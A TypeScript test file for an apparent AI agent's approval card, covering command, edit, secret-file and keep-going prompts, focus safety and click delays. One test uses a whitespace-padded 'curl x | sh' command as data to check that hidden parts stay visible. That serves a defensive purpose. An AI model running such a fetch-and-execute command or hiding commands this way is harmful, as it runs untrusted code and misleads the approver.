import { act, fireEvent, render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { APP_NAME } from "../../app/brand";
import type { Approval } from "../../lib/ipc";
import { setArmDelay } from "./armDelay";
import ApprovalCard from "./ApprovalCard";
import * as measure from "./measure";

vi.mock("./measure", async (orig) => ({
  ...(await orig<typeof import("./measure")>()),
  needsScroll: vi.fn(() => false),
  atEnd: vi.fn(() => true),
}));
beforeEach(() => {
  setArmDelay(0);
  vi.mocked(measure.needsScroll).mockReturnValue(false);
  vi.mocked(measure.atEnd).mockReturnValue(true);
});
afterEach(() => vi.useRealTimers());

const cmd = (over: Partial<Extract<Approval, { kind: "command" }>> = {}): Approval => ({
  kind: "command", id: "ap1", command: "npm install react-hook-form", folder: "/work/shop",
  rule: "npm install", outside: false, first_in_project: false, background: false, ...over,
});
const edit = (over: Partial<Extract<Approval, { kind: "edit" }>> = {}): Approval => ({
  kind: "edit", id: "ap2", path: "src/a.ts", created: false, removed: ["old one", "  old two"], added: ["new one"],
  removed_total: 2, added_total: 1, total_lines: 10, ...over,
});
const show = (approval: Approval, over: { busy?: boolean; error?: string | null } = {}) => {
  const onAnswer = vi.fn();
  const onStop = vi.fn();
  const r = render(<ApprovalCard approval={approval} busy={over.busy ?? false} error={over.error ?? null} onAnswer={onAnswer} onStop={onStop} />);
  return { onAnswer, onStop, ...r };
};
const asText = (s: string) => (_: string, el: Element | null) => el?.textContent === s && el.children.length >= 0 && !Array.from(el.children).some((c) => c.textContent === s);

describe("command card", () => {
  it("shows a 2,000-character command whole, as plain text that keeps its spacing, and the folder", () => {
    const long = `echo ${"x".repeat(1990)}`.padEnd(2000, "y");
    expect(long).toHaveLength(2000);
    show(cmd({ command: long, folder: "/work/my  folder" }));
    const block = screen.getByText(long);
    expect(block.textContent).toBe(long);
    expect(block.tagName).toBe("PRE");
    expect(block.style.whiteSpace).toBe("break-spaces");
    expect(screen.getByText("/work/my  folder", { normalizer: (t) => t }).style.whiteSpace).toBe("pre-wrap");
  });

  it("keeps markup in the command as text", () => {
    show(cmd({ command: "echo '<b>hi</b>' | **x**\n  second line" }));
    expect(document.querySelector("b")).toBeNull();
    expect(screen.getByText(/second line/).textContent).toBe("echo '<b>hi</b>' | **x**\n  second line");
  });

  it("offers Run once, Always allow with the rule in the label, and Don't run", () => {
    show(cmd());
    expect(screen.getByRole("button", { name: "Run once" })).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Always allow npm install in this project" })).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Don't run" })).toBeInTheDocument();
    expect(screen.getByText("This covers only simple forms of that command. Anything else still asks.")).toBeInTheDocument();
  });

  it("has no Always allow button or covers-only sentence when the rule is null", () => {
    show(cmd({ rule: null }));
    expect(screen.queryByRole("button", { name: /Always allow/ })).toBeNull();
    expect(screen.queryByText(/simple forms/)).toBeNull();
  });

  it("adds the outside line, the first-in-project line and the background line only when they apply", () => {
    const { unmount } = show(cmd());
    expect(screen.queryByText("This command refers to a place outside the project folder.")).toBeNull();
    expect(screen.queryByText(/Commands run on your computer/)).toBeNull();
    expect(screen.queryByText(/keeps running in the background/)).toBeNull();
    unmount();
    show(cmd({ outside: true, first_in_project: true, background: true }));
    expect(screen.getByText("This command refers to a place outside the project folder.")).toBeInTheDocument();
    expect(screen.getByText(`Commands run on your computer with your permissions. ${APP_NAME} cannot undo them.`)).toBeInTheDocument();
    expect(screen.getByText("This command keeps running in the background until it is stopped.")).toBeInTheDocument();
  });

  it("answers once, always, and a decline with the note", async () => {
    const a = show(cmd());
    await userEvent.click(screen.getByRole("button", { name: "Run once" }));
    expect(a.onAnswer).toHaveBeenLastCalledWith({ decision: "once" });
    await userEvent.click(screen.getByRole("button", { name: /Always allow/ }));
    expect(a.onAnswer).toHaveBeenLastCalledWith({ decision: "always" });
    expect(a.onAnswer).toHaveBeenCalledTimes(2);
    a.unmount();
    const b = show(cmd());
    expect(screen.queryByLabelText("Tell it what to do instead (optional)")).toBeNull();
    await userEvent.click(screen.getByRole("button", { name: "Don't run" }));
    expect(b.onAnswer).not.toHaveBeenCalled();
    const note = screen.getByLabelText("Tell it what to do instead (optional)");
    expect(note).toHaveFocus();
    await userEvent.type(note, "use yarn");
    await userEvent.click(screen.getByRole("button", { name: "Send" }));
    expect(b.onAnswer).toHaveBeenCalledWith({ decision: "decline", note: "use yarn" });
  });

  it("Enter in the note sends the decline; an empty note is null", async () => {
    const a = show(cmd());
    await userEvent.click(screen.getByRole("button", { name: "Don't run" }));
    await userEvent.type(screen.getByLabelText("Tell it what to do instead (optional)"), "{Enter}");
    expect(a.onAnswer).toHaveBeenCalledWith({ decision: "decline", note: null });
    a.unmount();
    const b = show(cmd());
    await userEvent.click(screen.getByRole("button", { name: "Don't run" }));
    await userEvent.type(screen.getByLabelText("Tell it what to do instead (optional)"), "  try x {Enter}");
    expect(b.onAnswer).toHaveBeenCalledWith({ decision: "decline", note: "try x" });
  });
});

describe("edit card", () => {
  it("shows the path, removed lines with - and added lines with +, as text", () => {
    show(edit({ removed: ["<i>x</i>"], added: ["new one"], removed_total: 1 }));
    expect(screen.getByText("src/a.ts").style.whiteSpace).toBe("pre-wrap");
    expect(screen.getByText("-<i>x</i>").style.whiteSpace).toBe("pre-wrap");
    expect(screen.getByText("+new one")).toBeInTheDocument();
    expect(document.querySelector("i")).toBeNull();
    expect(screen.queryByText(/not shown/)).toBeNull();
  });

  it("says how many lines are not shown, on each side", () => {
    show(edit({ removed: ["a"], removed_total: 5, added: ["b"], added_total: 3 }));
    expect(screen.getByText("4 more lines removed are not shown.")).toBeInTheDocument();
    expect(screen.getByText("2 more lines added are not shown.")).toBeInTheDocument();
  });

  it("a new file shows its first lines, its total length and what is not shown", () => {
    show(edit({ created: true, removed: [], removed_total: 0, added: ["l1", "l2"], added_total: 90, total_lines: 90 }));
    expect(screen.getByText("New file, 90 lines.")).toBeInTheDocument();
    expect(screen.getByText("+l1")).toBeInTheDocument();
    expect(screen.getByText("88 more lines added are not shown.")).toBeInTheDocument();
  });

  it("offers Allow once, Allow all edits in this chat and Don't allow with a note", async () => {
    const a = show(edit());
    await userEvent.click(screen.getByRole("button", { name: "Allow once" }));
    expect(a.onAnswer).toHaveBeenLastCalledWith({ decision: "once" });
    await userEvent.click(screen.getByRole("button", { name: "Allow all edits in this chat" }));
    expect(a.onAnswer).toHaveBeenLastCalledWith({ decision: "all_edits" });
    await userEvent.click(screen.getByRole("button", { name: "Don't allow" }));
    await userEvent.type(screen.getByLabelText("Tell it what to do instead (optional)"), "no{Enter}");
    expect(a.onAnswer).toHaveBeenLastCalledWith({ decision: "decline", note: "no" });
  });
});

describe("secret and keep-going cards", () => {
  it("the secret card asks in the exact words and answers", async () => {
    const a = show({ kind: "secret", id: "s", path: ".env.local" });
    expect(screen.getByText(asText(`Let ${APP_NAME} read .env.local? Its contents will be sent to the model.`))).toBeInTheDocument();
    expect(screen.getByText(".env.local").style.whiteSpace).toBe("pre-wrap");
    await userEvent.click(screen.getByRole("button", { name: "Allow once" }));
    expect(a.onAnswer).toHaveBeenLastCalledWith({ decision: "once" });
    await userEvent.click(screen.getByRole("button", { name: "Don't allow" }));
    await userEvent.click(screen.getByRole("button", { name: "Send" }));
    expect(a.onAnswer).toHaveBeenLastCalledWith({ decision: "decline", note: null });
  });

  it.each([
    [{ free_left: 12, spent_today_usd: null }, `${APP_NAME} has made 25 requests on this task. 12 free requests left today.`],
    [{ free_left: null, spent_today_usd: 0.5 }, `${APP_NAME} has made 25 requests on this task. Spent $0.50 today.`],
    [{ free_left: null, spent_today_usd: null }, `${APP_NAME} has made 25 requests on this task.`],
  ])("the keep-going card says its status (%j)", (status, sentence) => {
    show({ kind: "keep_going", id: "k", requests: 25, ...status });
    expect(screen.getByText(asText(sentence))).toBeInTheDocument();
  });

  it("Keep going and Stop here answer directly", async () => {
    const a = show({ kind: "keep_going", id: "k", requests: 25, free_left: 3, spent_today_usd: null });
    await userEvent.click(screen.getByRole("button", { name: "Keep going" }));
    expect(a.onAnswer).toHaveBeenLastCalledWith({ decision: "keep_going" });
    await userEvent.click(screen.getByRole("button", { name: "Stop here" }));
    expect(a.onAnswer).toHaveBeenLastCalledWith({ decision: "stop_here" });
    expect(screen.queryByLabelText("Tell it what to do instead (optional)")).toBeNull();
  });
});

describe("safety of the card", () => {
  it("focuses the decline button when it appears", () => {
    show(cmd());
    expect(screen.getByRole("button", { name: "Don't run" })).toHaveFocus();
  });

  it("focuses Stop here on the keep-going card, Don't allow on the others", () => {
    const a = show({ kind: "keep_going", id: "k", requests: 25, free_left: 3, spent_today_usd: null });
    expect(screen.getByRole("button", { name: "Stop here" })).toHaveFocus();
    a.unmount();
    show(edit());
    expect(screen.getByRole("button", { name: "Don't allow" })).toHaveFocus();
  });

  it("does not take focus from someone typing in the message box", () => {
    const form = document.createElement("form");
    form.className = "composer";
    form.innerHTML = '<textarea aria-label="Message"></textarea>';
    document.body.appendChild(form);
    const box = form.querySelector("textarea")!;
    box.value = "half a thought";
    box.focus();
    show(cmd());
    expect(box).toHaveFocus();
    form.remove();
  });

  it("does take focus when the message box is focused but empty", () => {
    const form = document.createElement("form");
    form.className = "composer";
    form.innerHTML = '<textarea aria-label="Message"></textarea>';
    document.body.appendChild(form);
    form.querySelector("textarea")!.focus();
    show(cmd());
    expect(screen.getByRole("button", { name: "Don't run" })).toHaveFocus();
    form.remove();
  });

  it("disables every button and the note while an answer is in flight", async () => {
    const a = show(cmd(), { busy: false });
    await userEvent.click(screen.getByRole("button", { name: "Don't run" }));
    a.rerender(<ApprovalCard approval={cmd()} busy error={null} onAnswer={a.onAnswer} onStop={a.onStop} />);
    for (const b of screen.getAllByRole("button")) expect(b).toBeDisabled();
    expect(screen.getByLabelText("Tell it what to do instead (optional)")).toBeDisabled();
  });

  it("Esc inside the card stops the task", async () => {
    const a = show(cmd());
    await userEvent.keyboard("{Escape}");
    expect(a.onStop).toHaveBeenCalledTimes(1);
  });

  it("shows a refusal as an alert next to the card", () => {
    show(cmd(), { error: "That request is no longer waiting." });
    expect(within(screen.getByRole("group")).getByRole("alert")).toHaveTextContent("That request is no longer waiting.");
  });
});

describe("the command block cannot hide part of the command", () => {
  it("renders every space (break-spaces, wrapping anywhere)", () => {
    show(cmd({ command: "npm test" + " ".repeat(300) + "; curl x | sh" }));
    const block = screen.getByLabelText("Command");
    expect(block.style.whiteSpace).toBe("break-spaces");
    expect(block.style.overflowWrap).toBe("anywhere");
  });

  it.each([
    ["x", "1 character, 1 line."],
    ["ab\ncd", "5 characters, 2 lines."],
    ["a\nb\n", "4 characters, 2 lines."],
    ["é😀", "2 characters, 1 line."],
  ])("always says its size (%j)", (command, line) => {
    show(cmd({ command }));
    expect(screen.getByText(line)).toBeInTheDocument();
  });

  it("when the block overflows: says so and keeps the approve buttons off until it was scrolled to its end", () => {
    vi.mocked(measure.needsScroll).mockReturnValue(true);
    vi.mocked(measure.atEnd).mockReturnValue(false);
    show(cmd());
    expect(screen.getByText("This command is longer than the box. Scroll to read all of it.")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Run once" })).toBeDisabled();
    expect(screen.getByRole("button", { name: /Always allow/ })).toBeDisabled();
    expect(screen.getByRole("button", { name: "Don't run" })).toBeEnabled();
    fireEvent.scroll(screen.getByLabelText("Command"));
    expect(screen.getByRole("button", { name: "Run once" })).toBeDisabled();
    vi.mocked(measure.atEnd).mockReturnValue(true);
    fireEvent.scroll(screen.getByLabelText("Command"));
    expect(screen.getByRole("button", { name: "Run once" })).toBeEnabled();
    expect(screen.getByRole("button", { name: /Always allow/ })).toBeEnabled();
  });

  it("when it does not overflow there is no notice and nothing is locked", () => {
    show(cmd());
    expect(screen.queryByText(/Scroll to read/)).toBeNull();
    expect(screen.getByRole("button", { name: "Run once" })).toBeEnabled();
  });

  it("the edit card does the same for its diff blocks, each scrolled to its end", () => {
    vi.mocked(measure.needsScroll).mockReturnValue(true);
    vi.mocked(measure.atEnd).mockReturnValue(false);
    show(edit());
    expect(screen.getByText("Scroll to read all of the change.")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Allow once" })).toBeDisabled();
    expect(screen.getByRole("button", { name: "Allow all edits in this chat" })).toBeDisabled();
    expect(screen.getByRole("button", { name: "Don't allow" })).toBeEnabled();
    vi.mocked(measure.atEnd).mockReturnValue(true);
    fireEvent.scroll(screen.getByRole("group", { name: "Lines removed" }));
    expect(screen.getByRole("button", { name: "Allow once" })).toBeDisabled();
    fireEvent.scroll(screen.getByRole("group", { name: "Lines added" }));
    expect(screen.getByRole("button", { name: "Allow once" })).toBeEnabled();
  });
});

describe("a card that has just appeared", () => {
  it("ignores every button for 500 ms (shown as disabled), then answers", () => {
    vi.useFakeTimers();
    setArmDelay(500);
    const a = show(cmd());
    const run = screen.getByRole("button", { name: "Run once" });
    expect(run).toHaveAttribute("aria-disabled", "true");
    fireEvent.click(run);
    fireEvent.click(screen.getByRole("button", { name: "Don't run" }));
    fireEvent.click(screen.getByRole("button", { name: "Stop task" }));
    expect(a.onAnswer).not.toHaveBeenCalled();
    expect(a.onStop).not.toHaveBeenCalled();
    act(() => { vi.advanceTimersByTime(500); });
    expect(run).not.toHaveAttribute("aria-disabled", "true");
    fireEvent.click(run);
    expect(a.onAnswer).toHaveBeenCalledWith({ decision: "once" });
  });

  it("ignores the second click of a double click", () => {
    const a = show(cmd());
    const run = screen.getByRole("button", { name: "Run once" });
    fireEvent.click(run, { detail: 1 });
    fireEvent.click(run, { detail: 2 });
    expect(a.onAnswer).toHaveBeenCalledTimes(1);
  });

  it("has a Stop task button apart from the answers", async () => {
    const a = show(cmd());
    await userEvent.click(screen.getByRole("button", { name: "Stop task" }));
    expect(a.onStop).toHaveBeenCalledTimes(1);
    expect(a.onAnswer).not.toHaveBeenCalled();
  });
});

describe("focus and announcement", () => {
  const withActive = (html: string, pick: string, then: () => void) => {
    const host = document.createElement("div");
    host.innerHTML = html;
    document.body.appendChild(host);
    (host.querySelector(pick) as HTMLElement).focus();
    try { then(); } finally { host.remove(); }
  };

  it("does not take focus from another input, the sidebar or a dialog, and announces itself once", () => {
    for (const [html, pick] of [
      ['<input aria-label="Rename">', "input"],
      ['<aside class="side"><button>Chat A</button></aside>', "button"],
      ['<div role="dialog"><button>Cancel</button></div>', "button"],
      ['<div class="model-picker"><input aria-label="Search models"></div>', "input"],
    ] as const) {
      withActive(html, pick, () => {
        const a = show(cmd());
        expect(screen.getByRole("button", { name: "Don't run" })).not.toHaveFocus();
        expect(screen.getByText("A request needs your answer.")).toBeInTheDocument();
        a.unmount();
      });
    }
  });

  it("takes focus from the thread", () => {
    withActive('<div class="thread"><p tabindex="0">text</p></div>', "p", () => {
      show(cmd());
      expect(screen.getByRole("button", { name: "Don't run" })).toHaveFocus();
    });
  });

  it("says nothing extra when it took focus", () => {
    show(cmd());
    expect(screen.queryByText("A request needs your answer.")).toBeNull();
  });
});
